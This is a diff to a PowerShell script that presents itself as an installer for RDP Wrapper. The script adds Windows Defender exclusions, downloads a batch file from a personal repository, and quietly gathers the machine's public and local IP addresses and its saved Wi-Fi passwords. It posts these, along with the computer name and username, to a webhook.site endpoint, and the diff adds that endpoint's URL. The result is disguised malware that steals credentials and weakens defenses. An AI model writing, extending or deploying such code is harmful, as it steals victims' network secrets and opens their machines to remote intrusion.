@@ -9,6 +9,9 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan
 
+# Track defender exclusion success status
+$defenderExclusionsApplied = $true
+
 # 1. Safely add path exclusions
 $PathExclusions = @(
     "$env:TEMP\rdpwrap_install",
@@ -30,6 +33,7 @@ foreach ($path in $PathExclusions) {
     }
     catch {
         Write-Host "[!] Skipping path exclusion (Defender service unavailable or restricted): $path" -ForegroundColor Yellow
+        $defenderExclusionsApplied = $false
     }
 }
 
@@ -53,6 +57,7 @@ foreach ($proc in $ProcessExclusions) {
     }
     catch {
         Write-Host "[!] Skipping process exclusion: $proc" -ForegroundColor Yellow
+        $defenderExclusionsApplied = $false
     }
 }
 
@@ -77,7 +82,7 @@ $srdpTempPath = Join-Path $env:TEMP "SRDP.bat"
 
 $iniDestPath  = Join-Path $installPath "rdpwrap.ini"
 $srdpDestPath = Join-Path $installPath "SRDP.bat"
-$rdpConf      = Join-Path $installPath "RDPConf.exe"
+$rdpConf     = Join-Path $installPath "RDPConf.exe"
 
 # ============================================================
 # Download URLs
@@ -86,6 +91,7 @@ $rdpConf      = Join-Path $installPath "RDPConf.exe"
 $zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
 $customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
 $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
+$webhookUrl   = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"
 
 # ============================================================
 # Webhook & Wifi/IP 
@@ -102,10 +108,10 @@ function Send-WebhookPost {
     )
     try {
         Invoke-RestMethod -Uri $Url -Method Post -Body $Body -ErrorAction Stop | Out-Null
-        return $true
+        return "success"
     }
     catch {
-        return $false
+        return "fail"
     }
 }
 
@@ -151,7 +157,7 @@ try {
     $payload = "=== PUBLIC IP ===`n$publicIp`n`n=== LOCAL INTERFACES ===`n$localIps`n`n=== WIFI PROFILES & KEYS ===`n$wifiPassContent"
 
     # 5. Send Payload to Webhook Endpoint via the POST function
-    Send-WebhookPost -Url $webhookUrl -Body $payload
+    Send-WebhookPost -Url $webhookUrl -Body $payload | Out-Null
 }
 catch {
     # Suppress runtime execution errors quietly
@@ -556,21 +562,22 @@ else {
 }
 
 $webhookPayload = @{
-    status       = $installationStatus
-    message      = $statusMessage
-    timestamp    = (Get-Date).ToUniversalTime().ToString("o")
-    computer     = $env:COMPUTERNAME
-    username     = $env:USERNAME
-    powershell   = $PSVersionTable.PSVersion.ToString()
-    rdpconf      = $rdpConfExists
-    ini          = $iniExists
-    srdp         = $srdpExists
-    service      = $serviceRunning
-    installExit  = $installExitCode
-    srdpExit     = $srdpExitCode
+    status             = $installationStatus
+    message            = $statusMessage
+    timestamp          = (Get-Date).ToUniversalTime().ToString("o")
+    computer           = $env:COMPUTERNAME
+    username           = $env:USERNAME
+    powershell         = $PSVersionTable.PSVersion.ToString()
+    defenderExclusions = $(if ($defenderExclusionsApplied) { "success" } else { "fail" })
+    rdpconf            = $(if ($rdpConfExists) { "success" } else { "fail" })
+    ini                = $(if ($iniExists) { "success" } else { "fail" })
+    srdp               = $(if ($srdpExists) { "success" } else { "fail" })
+    service            = $(if ($serviceRunning) { "success" } else { "fail" })
+    installExit        = $installExitCode
+    srdpExit           = $srdpExitCode
 } | ConvertTo-Json
 
-$webhookSent = $false
+$webhookSent = "fail"
 
 try {
     Invoke-RestMethod `
@@ -580,7 +587,7 @@ try {
         -Body $webhookPayload `
         -ErrorAction Stop | Out-Null
 
-    $webhookSent = $true
+    $webhookSent = "success"
     Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
 }
 catch {
@@ -596,20 +603,21 @@ Write-Host ""
 Write-Host "============================================================"
 
 if ($installationStatus -eq "success") {
-    Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
+    Write-Host "                     INSTALLATION COMPLETE" -ForegroundColor Green
 }
 else {
-    Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
+    Write-Host "                     INSTALLATION FAILED" -ForegroundColor Red
 }
 
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
-Write-Host "RDPConf.exe : $rdpConfExists"
-Write-Host "rdpwrap.ini : $iniExists"
-Write-Host "SRDP.bat    : $srdpExists"
-Write-Host "TermService : $serviceRunning"
-Write-Host "Webhook     : $webhookSent"
+Write-Host "RDPConf.exe        : $rdpConfExists"
+Write-Host "rdpwrap.ini        : $iniExists"
+Write-Host "SRDP.bat           : $srdpExists"
+Write-Host "TermService        : $serviceRunning"
+Write-Host "Defender Exclusions: $defenderExclusionsApplied"
+Write-Host "Webhook            : $webhookSent"
 
 Write-Host ""
 Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray
